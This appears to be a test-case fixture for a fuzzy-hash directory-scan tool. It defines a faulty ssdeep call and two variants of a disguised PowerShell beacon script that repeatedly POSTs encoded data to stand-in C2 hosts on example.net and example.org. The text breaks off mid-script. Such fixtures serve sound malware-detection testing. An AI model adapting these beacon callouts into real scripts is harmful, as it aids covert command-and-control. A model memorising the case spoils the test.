@@ -1,0 +1,575 @@
+# Matrix case P2049-149: hash_ssdeep_scan_directory says it finds similar
+# files in a directory and reports those at or above `threshold`, but it runs
+# `ssdeep -r -t N <dir>` with no matching mode (-d, -p, -m). Without one,
+# ssdeep only computes a fuzzy hash per file; -t only applies to matching
+# output. ssdeep is the real one (1.1).
+# The folder holds two variants of one PowerShell beacon script (C2 host and
+# key differ; `ssdeep -r -d` scores them 96) and an unrelated backup script.
+case_id: P2049-149
+problem: P2049
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: response
+level: mcp
+realism: common
+realism_ko: "떨군 스크립트의 변종을 폴더에서 찾으려고 퍼지 해시 유사도 검사를 쓰는 일은 흔하다."
+coverage: full
+summary: hash_ssdeep_scan_directory with threshold 50 on a folder holding two variants of one script (ssdeep scores them 96) returns success with a fuzzy hash line per file, the unrelated script included, and no match line, so no similar pair is reported.
+summary_ko: "한 스크립트의 변종 두 개(ssdeep 유사도 96)가 든 폴더에 `hash_ssdeep_scan_directory`를 threshold 50으로 돌리면, 관계없는 스크립트까지 파일마다 해시 한 줄씩만 담긴 성공 응답이 오고 비슷한 쌍은 보고되지 않는다."
+defect_ko: "이 서버는 비교 모드 없이 `ssdeep -r -t`를 돌려 파일별 퍼지 해시만 돌려준다. 설명대로라면 파일끼리 비교해 threshold 이상인 쌍(`A matches B (96)`)만 보고해야 한다. 모델은 폴더에 비슷한 파일이 없다고 잘못 알거나, 나열된 파일을 모두 threshold 이상 비슷한 파일로 잘못 안다."
+setup_ko: "C2 주소와 키만 다른 PowerShell 비컨 스크립트 두 개와 관계없는 백업 스크립트 하나를 폴더에 넣었다."
+env:
+  TRUDI_CACHE_DIR: ${DB_DIR}/cache
+fixture:
+  - path: scripts/WinUpdHealth.ps1
+    text: |
+      # Windows Update Health Service helper
+      param([string]$Mode = 'run')
+      $C2 = 'https://cdn-update.example.net/api/v2/'
+      $Key = '7f3a9c'
+      
+      function Get-SystemInfo0 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '00'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '01'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '02'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '03'))
+          Invoke-WebRequest -Uri ($C2 + 'task/0') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect1 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '10'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '11'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '12'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '13'))
+          Invoke-WebRequest -Uri ($C2 + 'task/1') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon2 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '20'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '21'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '22'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '23'))
+          Invoke-WebRequest -Uri ($C2 + 'task/2') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds3 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '30'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '31'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '32'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '33'))
+          Invoke-WebRequest -Uri ($C2 + 'task/3') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist4 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '40'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '41'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '42'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '43'))
+          Invoke-WebRequest -Uri ($C2 + 'task/4') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload5 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '50'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '51'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '52'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '53'))
+          Invoke-WebRequest -Uri ($C2 + 'task/5') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc6 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '60'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '61'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '62'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '63'))
+          Invoke-WebRequest -Uri ($C2 + 'task/6') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox7 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '70'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '71'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '72'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '73'))
+          Invoke-WebRequest -Uri ($C2 + 'task/7') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-SystemInfo8 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '80'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '81'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '82'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '83'))
+          Invoke-WebRequest -Uri ($C2 + 'task/8') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect9 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '90'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '91'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '92'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '93'))
+          Invoke-WebRequest -Uri ($C2 + 'task/9') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon10 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '100'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '101'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '102'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '103'))
+          Invoke-WebRequest -Uri ($C2 + 'task/10') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds11 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '110'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '111'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '112'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '113'))
+          Invoke-WebRequest -Uri ($C2 + 'task/11') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist12 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '120'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '121'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '122'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '123'))
+          Invoke-WebRequest -Uri ($C2 + 'task/12') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload13 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '130'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '131'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '132'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '133'))
+          Invoke-WebRequest -Uri ($C2 + 'task/13') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc14 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '140'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '141'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '142'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '143'))
+          Invoke-WebRequest -Uri ($C2 + 'task/14') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox15 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '150'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '151'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '152'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '153'))
+          Invoke-WebRequest -Uri ($C2 + 'task/15') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-SystemInfo16 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '160'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '161'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '162'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '163'))
+          Invoke-WebRequest -Uri ($C2 + 'task/16') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect17 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '170'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '171'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '172'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '173'))
+          Invoke-WebRequest -Uri ($C2 + 'task/17') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon18 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '180'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '181'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '182'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '183'))
+          Invoke-WebRequest -Uri ($C2 + 'task/18') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds19 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '190'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '191'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '192'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '193'))
+          Invoke-WebRequest -Uri ($C2 + 'task/19') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist20 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '200'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '201'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '202'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '203'))
+          Invoke-WebRequest -Uri ($C2 + 'task/20') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload21 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '210'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '211'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '212'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '213'))
+          Invoke-WebRequest -Uri ($C2 + 'task/21') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc22 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '220'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '221'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '222'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '223'))
+          Invoke-WebRequest -Uri ($C2 + 'task/22') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox23 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '230'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '231'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '232'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '233'))
+          Invoke-WebRequest -Uri ($C2 + 'task/23') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      while ($true) { Send-Beacon2; Start-Sleep -Seconds 60 }
+  - path: scripts/svc_helper.ps1
+    text: |
+      # Windows Update Health Service helper
+      param([string]$Mode = 'run')
+      $C2 = 'https://sync-health.example.org/api/v2/'
+      $Key = 'b81d02'
+      
+      function Get-SystemInfo0 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '00'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '01'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '02'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '03'))
+          Invoke-WebRequest -Uri ($C2 + 'task/0') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect1 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '10'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '11'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '12'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '13'))
+          Invoke-WebRequest -Uri ($C2 + 'task/1') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon2 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '20'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '21'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '22'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '23'))
+          Invoke-WebRequest -Uri ($C2 + 'task/2') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds3 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '30'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '31'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '32'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '33'))
+          Invoke-WebRequest -Uri ($C2 + 'task/3') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist4 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '40'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '41'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '42'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '43'))
+          Invoke-WebRequest -Uri ($C2 + 'task/4') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload5 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '50'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '51'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '52'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '53'))
+          Invoke-WebRequest -Uri ($C2 + 'task/5') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc6 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '60'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '61'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '62'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '63'))
+          Invoke-WebRequest -Uri ($C2 + 'task/6') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox7 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '70'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '71'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '72'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '73'))
+          Invoke-WebRequest -Uri ($C2 + 'task/7') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-SystemInfo8 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '80'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '81'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '82'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '83'))
+          Invoke-WebRequest -Uri ($C2 + 'task/8') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect9 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '90'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '91'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '92'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '93'))
+          Invoke-WebRequest -Uri ($C2 + 'task/9') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon10 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '100'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '101'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '102'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '103'))
+          Invoke-WebRequest -Uri ($C2 + 'task/10') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds11 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '110'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '111'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '112'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '113'))
+          Invoke-WebRequest -Uri ($C2 + 'task/11') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist12 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '120'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '121'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '122'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '123'))
+          Invoke-WebRequest -Uri ($C2 + 'task/12') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload13 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '130'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '131'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '132'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '133'))
+          Invoke-WebRequest -Uri ($C2 + 'task/13') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc14 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '140'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '141'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '142'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '143'))
+          Invoke-WebRequest -Uri ($C2 + 'task/14') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox15 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '150'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '151'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '152'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '153'))
+          Invoke-WebRequest -Uri ($C2 + 'task/15') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-SystemInfo16 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '160'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '161'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '162'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '163'))
+          Invoke-WebRequest -Uri ($C2 + 'task/16') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Collect17 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '170'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '171'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '172'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '173'))
+          Invoke-WebRequest -Uri ($C2 + 'task/17') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Send-Beacon18 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '180'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '181'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '182'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '183'))
+          Invoke-WebRequest -Uri ($C2 + 'task/18') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Creds19 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '190'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '191'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '192'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '193'))
+          Invoke-WebRequest -Uri ($C2 + 'task/19') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Set-Persist20 {
